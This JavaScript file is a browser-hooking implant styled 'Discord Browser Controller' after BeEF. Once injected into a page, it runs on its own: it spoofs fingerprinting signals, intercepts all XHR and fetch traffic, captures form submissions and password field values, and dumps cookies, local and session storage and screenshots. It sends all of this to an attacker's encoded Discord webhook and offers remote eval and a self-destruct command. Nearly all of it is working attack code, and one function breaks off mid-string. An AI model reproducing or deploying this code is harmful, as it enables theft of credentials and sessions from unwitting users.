/* ==== DISCORD BROWSER CONTROLLER ==== */
(function () {
  'use strict';
  if (typeof window.DiscordController !== 'undefined') return;

  // ───── CONFIG ─────
  const ENCODED_WEBHOOK   = '';               // ← YOUR BASE64 WEBHOOK HERE
  const WEBHOOK_FALLBACK  = '';               // optional secondary webhook (base64)
  const COMMAND_DELAY_MS  = 650;              // avoid rate-limits
  const STEALTH_MODE      = true;
  const PERSISTENCE       = false;            // survive reloads?
  const HAR_ENABLED       = true;
  const AUTO_SCREENSHOT   = true;
  // ──────────────────

  class DiscordController {
    constructor() {
      this.webhookUrls = this.decodeWebhooks();
      this.commands = new Map();
      this.sessionId = this.randId();
      this.queue = [];
      this.running = false;
      this.har = { log: { version: '1.2', creator: { name: 'BeEF-Discord', version: '1' }, entries: [] } };
      this.forms = new Set();
      this.obs = null;

      this.AUTO_CMDS = [
        {command:'get_info'}, {command:'export_cookies'}, {command:'get_localstorage'},
        {command:'get_sessionstorage'}, {command:'get_page_performance'},
        {command:'harvest_credentials'}, {command:'get_har_summary'},
        {command:'scroll_to_element', args:['body']}, {command:'get_html'}
        // {command:'screenshot'}   // enable if you want auto-screenshot
      ];

      this.init();
    }

    decodeWebhooks() {
      const urls = [];
      if (ENCODED_WEBHOOK) urls.push(atob(ENCODED_WEBHOOK));
      if (WEBHOOK_FALLBACK) urls.push(atob(WEBHOOK_FALLBACK));
      return urls.filter(Boolean);
    }
    randId() { return 'sess_' + Math.random().toString(36).substr(2,9) + '_' + Date.now().toString(36); }

    // ───── STEALTH ─────
    stealth() {
      if (!STEALTH_MODE) return;
      Object.defineProperty(navigator, 'webdriver', {get:()=>false});
      Object.defineProperty(navigator, 'plugins', {get:()=>[{name:'Chrome PDF Plugin'},{name:'Native Client'}]});
      Object.defineProperty(navigator, 'languages', {get:()=>['en-US','en']});
      const orig = HTMLCanvasElement.prototype.getContext;
      HTMLCanvasElement.prototype.getContext = function(t){ if(t==='2d'){ const ctx=orig.apply(this,arguments); const ft=ctx.fillText; ctx.fillText=(...a)=>{ if(Math.random()>0.95) a[0]+=' '; return ft.apply(this,a); }; return ctx; } return orig.apply(this,arguments); };
    }

    // ───── COMMANDS ─────
    setupCmds() {
      const c = (n,f) => this.commands.set(n,f.bind(this));
      c('export_cookies',()=>this.exportCookies());
      c('get_localstorage',()=>this.exportLocalStorage());
      c('get_sessionstorage',()=>this.exportSessionStorage());
      c('screenshot',()=>this.screenshot());
      c('navigate',(u)=>{location.href=u;return{success:true,url:u};});
      c('execute_js',(code)=>{return{success:true,result:eval(code)};});
      c('get_info',()=>this.info());
      c('click_element',(s)=>this.click(s));
      c('fill_form',(s,v)=>this.fill(s,v));
      c('get_html',(s='body')=>this.html(s));
      c('get_page_performance',()=>this.perf());
      c('harvest_credentials',()=>this.creds());
      c('get_har_summary',()=>this.harSummary());
      c('export_har',()=>this.exportHar());
      c('clear_all',()=>this.clearAll());
      c('set_cookie',(n,v,d)=>this.setCookie(n,v,d));
      c('simulate_keypress',(k,s='body')=>this.key(k,s));
      c('scroll_to_element',(s)=>this.scroll(s));
      c('self_destruct',()=>this.destruct());
    }

    // ───── INTERCEPTORS ─────
    intercept() {
      if (!HAR_ENABLED) return;
      const push = e => this.har.log.entries.push(e);
      const start = t=>performance.now();

      // XHR
      const oOpen = XMLHttpRequest.prototype.open;
      const oSend = XMLHttpRequest.prototype.send;
      XMLHttpRequest.prototype.open = function(m,u){ this._m=m; this._u=u; return oOpen.apply(this,arguments); };
      XMLHttpRequest.prototype.send = function(b){ const s=start(); this.addEventListener('load',()=>{ push({startedDateTime:new Date().toISOString(),time:performance.now()-s,request:{method:this._m,url:this._u,postData:b?{text:b}:null},response:{status:this.status,content:{text:this.response||''}}}); }); return oSend.apply(this,arguments); };

      // fetch
      const of = window.fetch;
      window.fetch = async (i,init)=>{ const url=typeof i==='string'?i:i.url; const m=init?.method||'GET'; const s=start(); try{ const r=await of(i,init); const c=r.clone(); const txt=await c.text(); push({startedDateTime:new Date().toISOString(),time:performance.now()-s,request:{method:m,url,postData:init?.body?{text:init.body}:null},response:{status:r.status,content:{text:txt}}}); return r; }catch(e){ push({startedDateTime:new Date().toISOString(),time:performance.now()-s,request:{method:m,url},response:{status:0,content:{text:e.message}}}); throw e; }};
    }

    // ───── OBSERVERS ─────
    observers() {
      this.obs = new MutationObserver(muts=>{ for(const m of muts) if(m.addedNodes.length) this.scanForms(m.addedNodes); });
      this.obs.observe(document.body,{childList:true,subtree:true});
      document.addEventListener('submit',e=>setTimeout(()=>this.formSubmit(e),100),true);
    }
    scanForms(nodes){ nodes.forEach(n=>{ if(n.tagName==='FORM' && !this.forms.has(n)){ this.forms.add(n); n.addEventListener('submit',e=>this.formSubmit(e)); } if(n.querySelectorAll) n.querySelectorAll('form').forEach(f=>{ if(!this.forms.has(f)){ this.forms.add(f); f.addEventListener('submit',e=>this.formSubmit(e)); }}); }); }
    async formSubmit(e){ const f=e.target; const d={}; new FormData(f).forEach((v,k)=>d[k]=v); await this.msg('Form Submitted',{URL:location.href,Action:f.action||'same-page',Data:'```json

    // ───── INIT ─────
    async init() {
      window.DiscordCtrl = this;
      this.stealth(); this.setupCmds(); this.intercept(); this.observers();
      if(!this.webhookUrls.length) return console.error('No webhook');
      await this.msg('Controller Connected',[
        {name:'Session',value:'`'+this.sessionId+'`'},
        {name:'URL',value:`[${location.hostname}](${location.href})`},
        {name:'UA',value:this.info().userAgent.split(' ').slice(-2).join(' ')}
      ]);
      this.runAuto();
    }

    // ───── AUTO RUN ─────
    runAuto(){ for(const c of this.AUTO_CMDS) this.queue.push(c); this.process(); }
    async process(){ if(this.running||this.queue.length===0) return; this.running=true; const cmd=this.queue.shift(); await new Promise(r=>setTimeout(r,COMMAND_DELAY_MS)); await this.exec(cmd).catch(()=>{}); this.running=false; if(this.queue.length) setTimeout(()=>this.process(),100); }

    // ───── EXEC ─────
    async exec({command,args=[]}){ if(!this.commands.has(command)) return this.msg('Unknown command',[{name:'Available',value:[...this.commands.keys()].map(c=>'`'+c+'`').join(', ')}]); try{ const res=await this.commands.get(command)(...args); const txt=JSON.stringify(res,null,2).slice(0,950); await this.msg(`Command: \`${command}\``,[{name:'Result',value:'```json\n'+txt+'\n```'},{name:'Session',value:'`'+this.sessionId+'`'}]); return res; }catch(e){ await this.msg(`Error: \`${command}\``,[{name:'Msg',value:'```\n'+e.message.slice(0,900)+'```'}]); }}

    // ───── CORE COMMANDS ─────
    info(){ return {sessionId:this.sessionId,userAgent:navigator.userAgent,url:location.href,title:document.title,viewport:{w:innerWidth,h:innerHeight}}; }
    async exportCookies(){ const list=document.cookie.split(';').map(c=>{const [n,...v]=c.trim().split('=');return{name:n,value:v.join('=')}}).filter(o=>o.name); await this.msg('Cookies Exported',[{name:'Count',value:list.length.toString()},{name:'Data',value:'```\n'+list.map(o=>`${o.name}=${o.value}`).join(';\n').slice(0,950)+'```'}]); return list; }
    async exportLocalStorage(){ const d={}; for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); d[k]=localStorage.getItem(k); } await this.msg('LocalStorage Exported',[{name:'Items',value:Object.keys(d).length.toString()},{name:'Data',value:'```json\n'+JSON.stringify(d,null,2).slice(0,950)+'```'}]); return d; }
    async exportSessionStorage(){ const d={}; for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); d[k]=sessionStorage.getItem(k); } await this.msg('SessionStorage Exported',[{name:'Items',value:Object.keys(d).length.toString()},{name:'Data',value:'```json\n'+JSON.stringify(d,null,2).slice(0,950)+'```'}]); return d; }
    async screenshot(){ if(typeof html2canvas==='undefined') await this.loadH2C(); const cv=await html2canvas(document.body,{logging:false}); const blob=await fetch(cv.toDataURL()).then(r=>r.blob()); await this.upload(blob,'screenshot_'+this.sessionId+'.png'); return {uploaded:true}; }
    loadH2C(){ return new Promise(res=>{ const s=document.createElement('script'); s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js'; s.onload=res; document.head.appendChild(s); }); }
    async upload(blob,name){ const fd=new FormData(); fd.append('file',blob,name); fd.append('payload_json',JSON.stringify({content:`**File:** \`${name}\``,username:'BeEF'})); for(const u of this.webhookUrls){ try{ const r=await fetch(u+'?wait=true',{method:'POST',body:fd}); if(r.ok) return true; }catch{}} return false; }
    creds(){ const p=document.querySelectorAll('input[type=password],input[name*=pass],input[name*=pwd]'); const out=[]; p.forEach(i=>{if(i.value) out.push({field:i.name||i.id||'?',value:i.value,page:location.href});}); if(out.length) this.msg('Credentials Found',[{name:'Count',value:out.length.toString()},{name:'Data',value:'```json\n'+JSON.stringify(out,null,2).slice(0,900)+'```'}]); return out; }
    harSummary(){ const e=this.har.log.entries; const dom=[...new Set(e.map(x=>new URL(x.request.url).hostname))]; return {total:e.length,domains:dom.slice(0,10),errors:e.filter(x=>x.response.status>=400).length}; }
    async exportHar(){ const blob=new Blob([JSON.stringify(this.har,null,2)],{type:'application/json'}); await this.upload(blob,'har_'+this.sessionId+'.json'); return {entries:this.har.log.entries.length}; }
    clearAll(){ document.cookie.split(';').forEach(c=>document.cookie=c.replace(/^ +/,'').replace(/=.*/,'=;expires='+new Date().toUTCString()+';path=/')); localStorage.clear(); sessionStorage.clear(); return {cleared:true}; }
    destruct(){ this.obs?.disconnect(); delete window.DiscordCtrl; console.clear(); document.body.innerHTML='<h1 style="text-align:center;margin-top:20%">Session terminated</h1>'; return {done:true}; }

    // ───── SEND ─────
    async msg(title,fields=[]){ const embed={title:'BeEF Discord Controller',description:title,color:0x00ff00,fields,timestamp:new Date().toISOString(),footer:{text:`Session: ${this.sessionId}`}}; for(const u of this.webhookUrls){ try{ const r=await fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed],username:'BeEF'})}); if(r.ok) return; }catch{} } }
  }

  // load html2canvas if needed
  if(typeof html2canvas==='undefined'){ const s=document.createElement('script'); s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js'; document.head.appendChild(s); }

  // start
  new DiscordController();

  // global shortcuts (optional)
  window.addCmd = (c,...a) => window.DiscordCtrl.queue.push({command:c,args:a});
  window.killCtrl = () => window.DiscordCtrl.destruct();

  console.log('%c[Discord Controller] Ready – Session: '+window.DiscordCtrl.sessionId,'color:#0f0;font-weight:bold');
})();
